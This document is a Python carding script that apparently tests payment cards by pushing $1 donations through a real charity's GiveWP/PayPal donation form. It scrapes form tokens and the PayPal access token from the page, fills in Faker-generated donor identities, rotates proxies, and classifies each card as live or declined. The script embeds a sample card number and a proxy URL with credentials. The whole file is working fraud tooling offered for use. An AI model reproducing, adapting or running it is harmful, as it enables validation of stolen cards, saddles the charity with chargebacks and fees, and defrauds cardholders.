import asyncio
import re
import json
import base64
import secrets
from faker import Faker
from curl_cffi.requests import AsyncSession
from proxy_manager import get_next_proxy
from requests_toolbelt.multipart.encoder import MultipartEncoder

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[-2:]
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

RESPONSE_MAP = {
    "true": ("Success", "Charged - $1 ! ✅", True),
    "sucsess": ("Success", "Charged - $1 ! ✅", True),
    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
    "account_closed": ("Declined", "Account Closed ❌", False),
    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
    "cvv2_failure": ("Declined", "CVV2_FAILURE ❌", False),
    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
    "invalid_account": ("Declined", "Invalid Account ❌", False),
    "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
    "pickup_card_special_conditions": ("Declined", "Pick Card Special Conditions ❌", False),
    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
    "generic_decline": ("Declined", "Generic Decline ❌", False),
    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
    "payment_denied": ("Declined", "Payment Denied ❌", False),
    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
    "security_violation": ("Declined", "Security Violation ❌", False),
    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
    "expired_card": ("Declined", "Expired Card ❌", False),
    "cryptographic_failure": ("Declined", "CRYPTOGRAPHIC_FAILURE ❌", False),
    "transaction_cannot_be_completed": ("Declined", "TRANSACTION_CANNOT_BE_COMPLETED ❌", False),
    "declined_please_retry": ("Declined", "DECLINED_PLEASE_RETRY_LATER ❌", False),
    "tx_attempts_exceed_limit": ("Declined", "TX_ATTEMPTS_EXCEED_LIMIT ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        token = secrets.token_hex(16)
        async with AsyncSession(impersonate="chrome124", proxies=proxies) as session:
            try:
                # ------------------- Step 1: GET with full headers -------------------
                print("\n[🌐 Step 1] Requesting Donation Page...")
                headers_get = {
                    'authority': 'bukjeh.org',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                resp_init = await session.get("https://bukjeh.org/donations/donation-2023-2-3/", headers=headers_get)
                print(f"   ├─ Status Code: {resp_init.status_code}")
                html = resp_init.text

                if "give-form-hash" not in html:
                    print("   ⚠️ Form fields not found, waiting 6s and retrying...")
                    await asyncio.sleep(6)
                    resp_init = await session.get("https://bukjeh.org/donations/donation-2023-2-3/", headers=headers_get)
                    html = resp_init.text

                try:
                    hash_val = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
                    pre = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
                    give = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
                except AttributeError:
                    print("   ❌ Could not find form fields in HTML.")
                    print(f"   └─ HTML Preview (first 500 chars): {html[:500]}")
                    return "Error", "Missing form parameters", False

                enc_match = re.search(r'"data-client-token":"(.*?)"', html)
                if not enc_match:
                    print("   ❌ data-client-token not found.")
                    return "Error", "data-client-token not found", False
                enc = enc_match.group(1)
                dec = base64.b64decode(enc).decode("utf-8")
                au_match = re.search(r'"accessToken":"(.*?)"', dec)
                if not au_match:
                    print("   ❌ accessToken not found.")
                    return "Error", "accessToken not found", False
                au = au_match.group(1)

                print(f"   ├─ Hash: {hash_val}")
                print(f"   ├─ Prefix: {pre}")
                print(f"   └─ Give ID: {give}")
                print(f"   └─ AccessToken: {au[:15]}...")

                # ------------------- Step 2: AJAX (no files) -------------------
                print("\n[⚡ Step 2] Sending give_process_donation...")
                headers_ajax1 = {
                    'authority': 'bukjeh.org',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://bukjeh.org',
                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                data_ajax1 = {
                    "give-fee-amount": "0",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Help us make A’amar",
                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": hash_val,
                    "give-price-id": "3",
                    "give-recurring-logged-in-only": "",
                    "give-logged-in-only": "1",
                    "_give_is_donation_recurring": "0",
                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                    "give-amount": "1.00",
                    "give-recurring-period-donors-choice": "month",
                    "payment-mode": "paypal-commerce",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "card_name": user_data["name"],
                    "card_exp_month": "",
                    "card_exp_year": "",
                    "give_action": "purchase",
                    "give-gateway": "paypal-commerce",
                    "action": "give_process_donation",
                    "give_ajax": "true",
                }
                resp_ajax1 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    headers=headers_ajax1,
                    data=data_ajax1,
                )
                print(f"   ├─ Status Code: {resp_ajax1.status_code}")
                print(f"   └─ Response: {resp_ajax1.text[:200]}")

                # ------------------- Step 3: create_order (multipart) -------------------
                print("\n[⚡ Step 3] Creating PayPal Order (create_order)...")
                headers_ajax2 = {
                    'authority': 'bukjeh.org',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'origin': 'https://bukjeh.org',
                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                params_ajax2 = {"action": "give_paypal_commerce_create_order"}

                files_ajax2 = {
                    "give-fee-amount": (None, "0"),
                    "give-fee-mode-enable": (None, "false"),
                    "give-fee-status": (None, "enabled"),
                    "give-honeypot": (None, ""),
                    "give-form-id-prefix": (None, pre),
                    "give-form-id": (None, give),
                    "give-form-title": (None, "Help us make A’amar"),
                    "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
                    "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
                    "give-form-minimum": (None, "1.00"),
                    "give-form-maximum": (None, "999999.99"),
                    "give-form-hash": (None, hash_val),
                    "give-price-id": (None, "3"),
                    "give-recurring-logged-in-only": (None, ""),
                    "give-logged-in-only": (None, "1"),
                    "_give_is_donation_recurring": (None, "0"),
                    "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
                    "give-amount": (None, "1.00"),
                    "give-recurring-period-donors-choice": (None, "month"),
                    "give_stripe_payment_method": (None, ""),
                    "payment-mode": (None, "paypal-commerce"),
                    "give_first": (None, user_data["first"]),
                    "give_last": (None, user_data["last"]),
                    "give_email": (None, user_data["email"]),
                    "card_name": (None, user_data["name"]),
                    "card_exp_month": (None, ""),
                    "card_exp_year": (None, ""),
                    "give-gateway": (None, "paypal-commerce"),
                }

                encoder_ajax2 = MultipartEncoder(fields=files_ajax2)
                headers_ajax2['Content-Type'] = encoder_ajax2.content_type

                resp_ajax2 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax2,
                    headers=headers_ajax2,
                    data=encoder_ajax2,
                )
                print(f"   ├─ Status Code: {resp_ajax2.status_code}")
                print(f"   └─ Response Text: {resp_ajax2.text}")

                try:
                    ajax2_json = resp_ajax2.json()
                    order_id = ajax2_json.get("data", {}).get("id")
                except Exception:
                    order_id = None

                if not order_id:
                    print("   ❌ [Error in Step 3] Failed to get order_id.")
                    return "Error", "Failed to create PayPal order", False
                print(f"   └─ Order ID Created: {order_id}")

                # ------------------- Step 4: Confirm payment via PayPal -------------------
                print("\n[💳 Step 4] Confirming Payment with PayPal API...")
                headers_paypal = {
                    'authority': 'cors.api.paypal.com',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'authorization': f'Bearer {au}',
                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'paypal-client-metadata-id': token,
                    'referer': 'https://assets.braintreegateway.com/',
                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                json_paypal = {
                    "payment_source": {
                        "card": {
                            "number": card_data["cc"],
                            "expiry": f"20{card_data['yy']}-{card_data['mm']}",
                            "security_code": card_data["cvv"],
                            "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
                        },
                    },
                    "application_context": {"vault": False},
                }
                resp_paypal = await session.post(
                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                    headers=headers_paypal,
                    json=json_paypal,
                )
                print(f"   ├─ Status Code: {resp_paypal.status_code}")
                print(f"   └─ Response: {resp_paypal.text[:250]}")
                paypal_text = resp_paypal.text.lower()

                # ------------------- Step 5: approve_order (multipart) -------------------
                print("\n[⚡ Step 5] Approving Order (approve_order)...")
                headers_ajax3 = {
                    'authority': 'bukjeh.org',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'origin': 'https://bukjeh.org',
                    'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                params_ajax3 = {
                    "action": "give_paypal_commerce_approve_order",
                    "order": order_id,
                }

                # نفس محتويات files_ajax2
                files_ajax3 = files_ajax2
                encoder_ajax3 = MultipartEncoder(fields=files_ajax3)
                headers_ajax3['Content-Type'] = encoder_ajax3.content_type

                resp_ajax3 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax3,
                    headers=headers_ajax3,
                    data=encoder_ajax3,
                )
                print(f"   ├─ Status Code: {resp_ajax3.status_code}")
                print(f"   └─ Response: {resp_ajax3.text}")

                approve_text = resp_ajax3.text.lower()
                combined = paypal_text + " " + approve_text

                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in combined:
                        return status, msg, is_live

                try:
                    error_data = resp_ajax3.json()
                    if 'data' in error_data and 'error' in error_data['data']:
                        return "Declined", f"{error_data['data']['error']} ❌", False
                except Exception:
                    pass

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                print(f"\n❌ [Exception Captured]: {str(e)}")
                return "Error", f"Exception: {str(e)}", False

# ------------------- دوال التشغيل -------------------
async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    max_attempts = 5
    for attempt in range(max_attempts):
        print(f"\n==================== Attempt {attempt + 1}/{max_attempts} ====================")
        user_data = tools.userdata()
        proxy_url_new = proxy_url if proxy_url else get_next_proxy()
        proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None

        status, msg, is_live = await Gateway.charge_card(
            card_data=card_data,
            user_data=user_data,
            proxies=proxies,
        )

        if "Order Not Approved" in msg:
            if attempt == max_attempts - 1:
                return status, msg, is_live
            continue
        else:
            return status, msg, is_live

    return "Error", "Max attempts exceeded unexpectedly", False

async def main():
    test_card = "4211566115568609|12|28|321"
    proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"

    print("🚀 Testing gateway (ST Charge)...")
    print(f"💳 Card: {test_card}")
    print(f"🌐 Connecting via: {proxy}")

    status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)

    print("\n---------------- FINAL RESULT ----------------")
    print(f"Status  : {status}")
    print(f"Message : {message}")
    print(f"Live    : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
